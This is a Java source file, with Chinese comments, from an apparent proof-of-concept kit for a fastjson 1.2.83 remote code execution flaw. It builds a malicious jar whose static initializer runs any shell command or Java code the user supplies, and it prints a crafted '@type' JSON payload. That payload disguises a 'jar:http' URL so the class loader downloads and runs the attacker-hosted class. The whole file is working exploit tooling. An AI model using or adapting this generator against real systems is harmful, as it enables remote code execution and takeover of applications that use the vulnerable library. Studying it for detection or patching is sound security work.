package PoC_1283;

import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;

/**
 * 生成 fastjson 1.2.83 RCE 【一阶段 · jar:http 远程加载】的恶意 jar。
 *
 * 原理：@type 里的点号会被 replace('.','/') 转成 /，从而把类名伪装成资源路径：
 *   @type      = "jar:http:..<IP_INT>:<PORT>.<jarName>!.POC"
 *   → 资源路径  = jar:http://<IP_INT>:<PORT>/<jarName>!/POC.class
 *   → LaunchedURLClassLoader 下载该 jar → 读 POC.class → ASM 检测 @JSONType → jsonType=true
 *   → loadClass → <clinit> 执行
 *
 * static 逻辑有三种输入（三选一，见 --cmd/--code/--code-file）。
 *
 * 使用：
 *   java -cp ... PoC_1283.GenHttpProbe \
 *       [--host 127.0.0.1] [--port 11111] [--jar probe] \
 *       (--cmd "touch /tmp/success" | --code "new File('/tmp/x').createNewFile();" | --code-file payload.java)
 */
public class GenHttpProbe {

    public static void main(String[] args) throws Exception {
        String host = "127.0.0.1";
        String port = "11111";
        String jarName = "probe";
        String mode = "cmd";
        String value = "touch /tmp/success";

        for (int i = 0; i < args.length; i++) {
            switch (args[i]) {
                case "--host": host = args[++i]; break;
                case "--port": port = args[++i]; break;
                case "--jar":  jarName = args[++i]; break;
                case "--cmd": case "--code": case "--code-file":
                    mode = args[i].substring(2);
                    value = args[++i];
                    break;
                default:
                    System.err.println("unknown arg: " + args[i]);
                    System.err.println("usage: GenHttpProbe [--host H] [--port P] [--jar J] (--cmd C | --code JAVA | --code-file F)");
                    System.exit(1);
            }
        }

        long ipInt = ipToInt(host);
        // 类的 internal name（/ 分隔），加载时与 @type 替换后匹配
        String internalName = "jar:http://" + ipInt + ":" + port + "/" + jarName + "!/POC";

        byte[] classBytes = JavassistGen.generate(internalName, JavassistGen.resolveBody(mode, value));
        writeJar("www/" + jarName, "POC.class", classBytes);

        System.out.println("[+] jar written  : www/" + jarName);
        System.out.println("[+] internalName : " + internalName);
        System.out.println("[+] body(mode)   : " + mode);
        System.out.println("[+] payload      : {\"@type\":\"jar:http:.." + ipInt + ":" + port + "." + jarName + "!.POC\",\"x\":1}");
    }

    /** IPv4 点分十进制 → 整数（payload 里的 IP 不能含点，否则被 replace 破坏） */
    static long ipToInt(String ip) {
        String[] p = ip.split("\\.");
        return (Long.parseLong(p[0]) << 24)
             | (Long.parseLong(p[1]) << 16)
             | (Long.parseLong(p[2]) << 8)
             | Long.parseLong(p[3]);
    }

    /** 把单个 class 打包成 jar 文件 */
    static void writeJar(String path, String entryName, byte[] classBytes) throws IOException {
        Files.createDirectories(Paths.get(path).getParent());
        try (JarOutputStream jos = new JarOutputStream(new FileOutputStream(path))) {
            jos.putNextEntry(new JarEntry(entryName));
            jos.write(classBytes);
            jos.closeEntry();
        }
    }
}